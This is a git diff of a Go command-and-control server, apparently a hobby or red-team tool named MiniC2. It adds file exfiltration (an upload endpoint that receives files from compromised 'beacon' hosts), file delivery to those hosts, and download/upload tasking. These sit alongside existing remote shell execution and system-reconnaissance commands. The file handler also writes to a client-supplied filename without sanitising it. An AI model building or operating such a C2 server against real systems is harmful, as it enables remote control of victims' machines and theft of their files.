@@ -5,6 +5,7 @@ import (
 	"errors"
 	"flag"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"os"
@@ -29,6 +30,7 @@ var (
 	warn         = color.FgYellow.Render("[*]")
 	succ         = color.FgGreen.Render("[*]")
 	notif        = color.FgBlue.Render("[*]")
+	servedFile   string
 )
 
 func main() {
@@ -55,10 +57,12 @@ func main() {
 		http.HandleFunc("/register", registerAgent)
 		http.HandleFunc("/tasks", sendTasks)
 		http.HandleFunc("/results", receiveOutput)
-		fmt.Printf("\n"+succ+" Starting listening on port: %s\n", *port)
+		http.HandleFunc("/file", receiveFile)
+		http.HandleFunc("/download", serveFile)
+		//fmt.Printf("\n"+succ+" Starting listening on port: %s\n", *port)
 		log.Fatal(http.ListenAndServe(":"+*port, nil))
 	}()
-
+	fmt.Printf("\n"+succ+" Starting listening on port: %s\n", *port)
 	startMainPrompt()
 
 }
@@ -83,11 +87,54 @@ func registerAgent(w http.ResponseWriter, r *http.Request) {
 
 func receiveOutput(w http.ResponseWriter, r *http.Request) {
 	r.ParseForm()
-	fmt.Println("\n"+succ+" Host Called Home:", r.FormValue("id"), "\n\n"+r.FormValue("output")+"\n")
+	fmt.Println("\n"+succ+" Host Called Home:", r.FormValue("id"), "\n\n"+r.FormValue("output"))
+}
+
+func receiveFile(w http.ResponseWriter, r *http.Request) {
+	r.ParseMultipartForm(32 << 20)
+	file, handler, err := r.FormFile("uploadfile")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	defer file.Close()
+	fmt.Fprintf(w, "%v", handler.Header)
+	f, err := os.OpenFile("./"+handler.Filename, os.O_WRONLY|os.O_CREATE, 0666)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	defer f.Close()
+	io.Copy(f, file)
+
+	fmt.Println(succ, "File received!:", handler.Filename)
+}
+
+func serveFile(w http.ResponseWriter, r *http.Request) {
+	/*
+		if servedFile == "" {
+			return
+		}
+		f, err := os.Open(servedFile)
+		if err != nil {
+			return
+		}
+		defer f.Close()
+
+		fileInfo, err := f.Stat()
+		if err != nil {
+			return
+		}
+	*/
+
+	http.ServeFile(w, r, servedFile)
+}
+
+func setUploadFile(filename string) {
+	servedFile = filename
 }
 
 func sendTasks(w http.ResponseWriter, r *http.Request) {
-	//creating a string string map to queue up tasks
 	r.ParseForm()
 
 	agent := r.FormValue("id")
@@ -214,6 +261,23 @@ func agentExecutor(c string) {
 	} else if strings.Fields(c)[0] == "ls" {
 		fmt.Println(notif + "Tasked beacon with: " + strings.Fields(c)[0])
 		tasklist[currentAgent] = append(tasklist[currentAgent], c)
+	} else if strings.Fields(c)[0] == "download" {
+		if len(strings.Fields(c)) == 1 {
+			fmt.Println("Usage: download <file(s)>")
+			return
+		}
+		fmt.Println(notif + "Tasked beacon with: " + strings.Fields(c)[0])
+		tasklist[currentAgent] = append(tasklist[currentAgent], c)
+
+	} else if strings.Fields(c)[0] == "upload" {
+		if len(strings.Fields(c)) == 1 || len(strings.Fields(c)) > 2 {
+			fmt.Println("Usage: upload <file>")
+			return
+		}
+		fmt.Println(notif + "Tasked beacon with: " + strings.Fields(c)[0])
+		tasklist[currentAgent] = append(tasklist[currentAgent], c)
+		setUploadFile(strings.Fields(c)[1])
+
 	} else if strings.Fields(c)[0] == "help" {
 		t := tabby.New()
 		t.AddHeader("Command", "Description")
@@ -221,12 +285,15 @@ func agentExecutor(c string) {
 		t.AddLine("sysinfo", "Queries system information of agent")
 		t.AddLine("getuid", "Retrieves user and group information")
 		t.AddLine("netinfo", "Retrieves network interfaces and IP addresses")
-		t.AddLine("===OS COMMANDS===")
+		t.AddLine("\n===OS COMMANDS===")
 		t.AddLine("cd <dir>", "Changes Directory")
 		t.AddLine("pwd", "Prints Working Directory")
 		t.AddLine("chmod <mode> <file(s)>", "Changes permissions of specified files")
 		t.AddLine("mkdir <dir(s)>", "Creates specified Directories")
 		t.AddLine("ls <path>", "List the contents of the specified directory")
+		t.AddLine("\n====EXTRA COMMANDS====")
+		t.AddLine("download <file(s)>", "Downloads specified files")
+		t.AddLine("upload <file>", "Uploads specified file")
 		t.AddLine("exec <command>", "Executes specified shell command (Pipes and arrows work!)")
 		t.AddLine("exit/background/back", "Return to MiniC2 main menu")
 		t.Print()
